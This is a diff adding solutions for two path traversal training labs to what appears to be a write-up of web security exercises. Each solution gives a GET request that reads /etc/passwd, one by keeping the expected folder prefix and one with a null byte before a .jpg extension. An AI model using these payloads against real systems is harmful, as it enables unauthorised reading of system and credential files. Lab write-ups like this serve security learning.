@@ -97,3 +97,43 @@ Which doesn't work. Trying double URL encoding with:
 
 solves the lab.
 
+# Lab 5
+
+## Description
+
+This lab contains a path traversal vulnerability in the display of product images.
+
+The application transmits the full file path via a request parameter, and validates that the supplied path starts with the expected folder.
+
+To solve the lab, retrieve the contents of the `/etc/passwd` file.
+
+## Solution
+
+Server only validates the start of the path. Solution: keep the start of the file path:
+
+```
+GET /image?filename=/var/www/images/../../../../../../../../../etc/passwd
+```
+
+which returns the contents of `/etc/passwd` and solves the lab.
+
+
+# Lab 6
+
+## Description
+
+This lab contains a path traversal vulnerability in the display of product images.
+
+The application validates that the supplied filename ends with the expected file extension.
+
+To solve the lab, retrieve the contents of the `/etc/passwd` file.
+
+## Solution
+
+The server checks the file extension. Using the nullbyte trick before the extension validates the extension verification but truncates the extension when processing the file path:
+
+```
+GET /image?filename=../../../../../../../etc/passwd%00.jpg
+```
+
+which solves the lab.
